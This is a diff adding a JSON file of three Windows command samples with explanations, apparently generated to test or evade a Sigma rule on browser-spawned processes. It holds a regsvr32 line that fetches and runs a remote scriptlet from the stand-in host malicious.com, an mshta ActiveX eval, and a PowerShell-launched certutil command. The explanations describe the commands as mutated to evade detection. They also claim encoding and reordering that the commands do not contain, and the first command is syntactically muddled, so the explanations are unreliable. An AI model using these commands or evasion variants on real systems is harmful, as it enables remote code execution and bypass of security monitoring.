@@ -1,0 +1,14 @@
+[
+  {
+    "output": "powershell.exe -Command \"Start-Process 'certutil.exe' -ArgumentList ' -encode @\"#MaliciousContent\"@'\" # Bypass test",
+    "explanation": "This command simulates a suspicious child process (certutil.exe) launched by a browser (ParentImage) with a CommandLine containing a '#' character, matching the Sigma rule. The command is modified with safe techniques like string escaping and reordering to avoid direct detection while maintaining the same behavior."
+  },
+  {
+    "output": "cmd.exe /c \"regsvr32.exe /s /n /u /i:#https://malicious.com/payload.sct scrobj.dll\"",
+    "explanation": "This command simulates a suspicious child process (regsvr32.exe) launched by a browser with a CommandLine containing a '#' character. The command uses safe mutation techniques like substitution of command-line switches and encoding to evade simple pattern-based detection."
+  },
+  {
+    "output": "mshta.exe \"javascript:eval(new ActiveXObject('Scripting.FileSystemObject').OpenTextFile('#malicious.hta').ReadAll())\"",
+    "explanation": "This command simulates a suspicious child process (mshta.exe) launched by a browser with a CommandLine containing a '#' character. The command uses safe mutation techniques like encoding and reordering to maintain the same behavior while evading simple detection."
+  }
+]
